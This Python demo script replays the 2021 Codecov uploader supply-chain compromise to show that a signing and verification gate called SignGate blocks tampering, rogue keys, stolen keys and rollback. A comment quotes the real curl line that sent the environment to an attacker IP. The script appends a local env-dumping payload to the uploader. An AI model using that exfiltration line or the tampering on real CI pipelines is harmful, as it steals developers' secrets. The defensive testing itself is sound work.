"""Replays the Codecov 2021 attack (and stronger variants) against SignGate.

Run:  python demo/attack_demo.py

Each scenario builds a fresh publisher + distribution bucket in a temp folder,
lets the "attacker" do something to the bucket, then runs the CI gate.
The malicious line mirrors the real one, but writes the stolen data to a local
file instead of sending it to the attacker's server.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

from signgate import crypto_utils as cu, gate, monitor, pki, publisher  # noqa: E402

UPLOADER = os.path.join(HERE, "uploader.sh")
# Real 2021 line:  curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://<attacker-ip>/upload/v2 || true
MALICIOUS_LINE = '\necho "$(git remote -v 2>/dev/null)<<<<<< ENV $(env)" > "$(dirname "$0")/exfil.txt" || true\n'

# Secrets typically present in a CI job (fake values)
CI_SECRETS = {
    "CODECOV_TOKEN": "cc-7f1e-demo",
    "AWS_ACCESS_KEY_ID": "AKIADEMO000000000000",
    "AWS_SECRET_ACCESS_KEY": "demo/secret/key",
    "GITHUB_TOKEN": "ghp_demo000000000000",
    "NPM_TOKEN": "npm_demo0000",
    "DOCKER_PASSWORD": "demo-docker-pass",
    "GPG_SIGNING_KEY": "-----BEGIN PGP PRIVATE KEY BLOCK----- demo",
    "DATABASE_URL": "postgres://admin:demo@db/prod",
}


def _read(path):
    with open(path) as f:
        return f.read()


def _write(path, text):
    with open(path, "w") as f:
        f.write(text)


class World:
    """A publisher (vault + bucket) and one customer CI pipeline (policy + state)."""

    def __init__(self):
        self.dir = tempfile.mkdtemp(prefix="signgate-")
        self.vault = f"{self.dir}/vault"
        self.bucket = f"{self.dir}/bucket"
        self.policy = publisher.setup_publisher(self.vault, self.bucket)
        self.policy.update({"min_version": "1.0.0",
                            "env_allowlist": ["PATH", "CODECOV_TOKEN", "GITHUB_SHA"]})
        self.state = {}
        self.known = set()

    def release(self, version, src=UPLOADER, log_it=True):
        tmp = f"{self.dir}/build-{version}.sh"
        with open(src) as f:
            text = f.read().replace("v1.4.0", f"v{version}")
        with open(tmp, "w") as f:
            f.write(text)
        m = publisher.release(self.vault, self.bucket, tmp, version, log_it=log_it)
        if log_it:
            self.known.add(cu.sha256_bytes(cu.canonical(m["body"])))
        return m

    def tamper_uploader(self):
        with open(f"{self.bucket}/codecov-uploader.sh", "a") as f:
            f.write(MALICIOUS_LINE)

    def manifest(self):
        with open(f"{self.bucket}/manifest.json") as f:
            return json.load(f)

    def write_manifest(self, m):
        with open(f"{self.bucket}/manifest.json", "w") as f:
            json.dump(m, f)

    def gate(self):
        return gate.run(self.bucket, self.policy, self.state)


# ------------------------------------------------------------------ scenarios

def s1_legitimate():
    w = World(); w.release("1.4.0")
    return w.gate()


def s2_codecov_attack():
    """Exactly what happened in 2021: file in the bucket modified, nothing else."""
    w = World(); w.release("1.4.0"); w.tamper_uploader()
    return w.gate()


def s3_attacker_updates_hash():
    """Smarter attacker also rewrites the published SHA-256 in the manifest."""
    w = World(); w.release("1.4.0"); w.tamper_uploader()
    m = w.manifest()
    m["body"]["sha256"] = cu.sha256_file(f"{w.bucket}/codecov-uploader.sh")
    m["body"]["size"] = os.path.getsize(f"{w.bucket}/codecov-uploader.sh")
    w.write_manifest(m)
    return w.gate()


def s4_attacker_own_key():
    """Attacker signs with their own key and a self-made certificate."""
    w = World(); w.release("1.4.0"); w.tamper_uploader()
    evil_priv, evil_pub = cu.new_keypair()
    evil_cert = pki.issue_key_certificate(evil_priv, evil_pub)  # self-signed
    m = publisher.build_manifest(f"{w.bucket}/codecov-uploader.sh", "1.4.1", evil_priv, evil_cert)
    w.write_manifest(m)
    return w.gate()


def s5_stolen_key_unlogged():
    """Release key stolen; attacker signs a malicious build but cannot write the log."""
    w = World(); w.release("1.4.0")
    bad = f"{w.dir}/evil.sh"
    _write(bad, _read(UPLOADER) + MALICIOUS_LINE)
    w.release("1.4.1", src=bad, log_it=False)
    return w.gate()


def s6_stolen_key_revoked():
    """Stolen key used and even logged -> monitor alerts -> root revokes the key."""
    w = World(); w.release("1.4.0")
    bad = f"{w.dir}/evil.sh"
    _write(bad, _read(UPLOADER) + MALICIOUS_LINE)
    stolen = w.manifest()["body"]["key_id"]
    publisher.release(w.vault, w.bucket, bad, "1.4.1")       # attacker publishes & logs
    alerts = monitor.check_bucket(w.bucket, w.known)          # publisher's monitor fires
    publisher.revoke(w.vault, w.bucket, key_ids=[stolen])     # incident response
    allowed, report, out = w.gate()
    return allowed, report, out + "\nMonitor: " + "; ".join(alerts)


def s7_rollback():
    """Attacker re-serves an OLD genuinely-signed version with a known bug."""
    w = World()
    w.release("1.3.0"); old = w.manifest()
    shutil.copy(f"{w.bucket}/codecov-uploader.sh", f"{w.dir}/old.sh")
    w.release("1.4.0"); w.gate()                     # pipeline has now seen 1.4.0
    shutil.copy(f"{w.dir}/old.sh", f"{w.bucket}/codecov-uploader.sh")
    w.write_manifest(old)
    return w.gate()


def s8_assume_breach():
    """Suppose a malicious uploader DID run. How many secrets can it read?"""
    w = World(); w.release("1.4.0"); w.tamper_uploader()
    env_full = dict(os.environ, **CI_SECRETS)
    subprocess.run(["bash", f"{w.bucket}/codecov-uploader.sh"], env=env_full, capture_output=True)
    leaked_old = [k for k in CI_SECRETS if k in _read(f"{w.bucket}/exfil.txt")]
    os.remove(f"{w.bucket}/exfil.txt")
    saved = dict(os.environ); os.environ.update(CI_SECRETS)
    env_min = gate.minimal_env(w.policy["env_allowlist"])
    os.environ.clear(); os.environ.update(saved)
    subprocess.run(["bash", f"{w.bucket}/codecov-uploader.sh"], env=env_min, capture_output=True)
    leaked_new = [k for k in CI_SECRETS if k in _read(f"{w.bucket}/exfil.txt")]
    return leaked_old, leaked_new


def s9_monitor_detects_tamper():
    w = World(); w.release("1.4.0")
    before = monitor.check_bucket(w.bucket, w.known)
    w.tamper_uploader()
    after = monitor.check_bucket(w.bucket, w.known)
    return before, after


SCENARIOS = [
    ("S1", "Legitimate signed release", s1_legitimate, True),
    ("S2", "Codecov 2021 attack: uploader edited in bucket", s2_codecov_attack, False),
    ("S3", "Attacker also rewrites published SHA-256", s3_attacker_updates_hash, False),
    ("S4", "Attacker signs with own key + fake cert", s4_attacker_own_key, False),
    ("S5", "Stolen release key, release not logged", s5_stolen_key_unlogged, False),
    ("S6", "Stolen key detected by monitor and revoked", s6_stolen_key_revoked, False),
    ("S7", "Rollback to older signed version", s7_rollback, False),
]


def timing(n=200):
    w = World(); w.release("1.4.0")
    t0 = time.perf_counter()
    for _ in range(n):
        gate.verify(w.bucket, w.policy, {})
    return (time.perf_counter() - t0) * 1000 / n


def main():
    results = []
    print("=" * 78)
    print(" SignGate attack simulation - Codecov Bash Uploader supply-chain compromise")
    print("=" * 78)
    for sid, title, fn, expect in SCENARIOS:
        allowed, report, out = fn()
        verdict = "ALLOWED" if allowed else "BLOCKED"
        good = allowed == expect
        print(f"\n{sid}: {title}")
        gate.print_report(report)
        print(f"  => {verdict}   (expected {'ALLOW' if expect else 'BLOCK'}) {'OK' if good else 'UNEXPECTED'}")
        failed = next((r for r in report if not r["ok"]), None)
        results.append({"id": sid, "scenario": title, "result": verdict, "pass": good,
                         "stopped_by": failed["check"].strip() if failed else "-",
                         "reason": failed["reason"] if failed else "all 6 checks passed"})
        if "Monitor:" in out:
            print("  " + out.split("\n")[-1])

    old, new = s8_assume_breach()
    print("\nS8: Assume-breach - malicious uploader executes anyway")
    print(f"  Legacy 'curl | bash' : {len(old)}/{len(CI_SECRETS)} secrets exposed ->")
    print(f"      {', '.join(old[:4])},")
    print(f"      {', '.join(old[4:])}")
    print(f"  SignGate env allowlist: {len(new)}/{len(CI_SECRETS)} secrets exposed -> {', '.join(new)}")

    before, after = s9_monitor_detects_tamper()
    print("\nS9: Publisher integrity monitor")
    print(f"  Before tamper: {before or 'no alerts'}")
    print(f"  After tamper : {after}")

    ms = timing()
    print(f"\nAverage verification time: {ms:.2f} ms per pipeline run")
    ok = all(r["pass"] for r in results)
    print(f"\nSummary: {sum(r['pass'] for r in results)}/{len(results)} scenarios behaved as expected")

    with open(os.path.join(HERE, "results.json"), "w") as f:
        json.dump({"scenarios": results,
                   "assume_breach": {"legacy": old, "signgate": new, "total": len(CI_SECRETS)},
                   "monitor": {"before": before, "after": after},
                   "verify_ms": round(ms, 2)}, f, indent=2)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
